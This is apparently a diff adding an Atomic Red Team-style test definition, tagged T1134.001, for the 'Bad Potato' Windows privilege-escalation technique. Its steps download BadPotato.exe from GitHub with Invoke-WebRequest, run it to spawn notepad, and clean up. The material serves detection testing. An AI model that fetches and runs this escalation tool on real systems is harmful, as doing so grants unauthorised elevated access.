@@ -1,0 +1,97 @@
+{
+  "id": "9c6d799b-c111-4749-a42f-ec2f8cb51448",
+  "name": "Bad Potato",
+  "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "2c55bf9e-2367-477f-836c-93c199cbe8f1",
+      "type": "execute-command",
+      "data": {
+        "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6cccdb78-d8e8-4e06-8973-7806f1cfd578",
+      "type": "execute-command",
+      "data": {
+        "command": "taskkill /f /im notepad.exe\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "97833191-b5de-4eac-9d01-10907271a8c3",
+      "name": "Check dependency 1/1",
+      "description": "BadPotato.exe must exist in the temp directory\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "cdfa5419-e7e4-4eb6-b907-04cf2ca25085",
+      "name": "Resolve dependency 1/1",
+      "description": "BadPotato.exe must exist in the temp directory\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "be97b3eb-2a86-4abd-8662-6558548ac43e",
+      "name": "Re-check dependency 1/1",
+      "description": "BadPotato.exe must exist in the temp directory\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "2c55bf9e-2367-477f-836c-93c199cbe8f1",
+      "p": "on-success",
+      "o": "6cccdb78-d8e8-4e06-8973-7806f1cfd578"
+    },
+    {
+      "s": "2c55bf9e-2367-477f-836c-93c199cbe8f1",
+      "p": "on-failure",
+      "o": "6cccdb78-d8e8-4e06-8973-7806f1cfd578"
+    },
+    {
+      "s": "97833191-b5de-4eac-9d01-10907271a8c3",
+      "p": "on-success",
+      "o": "2c55bf9e-2367-477f-836c-93c199cbe8f1"
+    },
+    {
+      "s": "97833191-b5de-4eac-9d01-10907271a8c3",
+      "p": "on-failure",
+      "o": "cdfa5419-e7e4-4eb6-b907-04cf2ca25085"
+    },
+    {
+      "s": "cdfa5419-e7e4-4eb6-b907-04cf2ca25085",
+      "p": "on-success",
+      "o": "be97b3eb-2a86-4abd-8662-6558548ac43e"
+    },
+    {
+      "s": "be97b3eb-2a86-4abd-8662-6558548ac43e",
+      "p": "on-failure",
+      "o": "2c55bf9e-2367-477f-836c-93c199cbe8f1"
+    }
+  ],
+  "tags": [
+    "T1134.001",
+    "atomic-red-team"
+  ]
+}
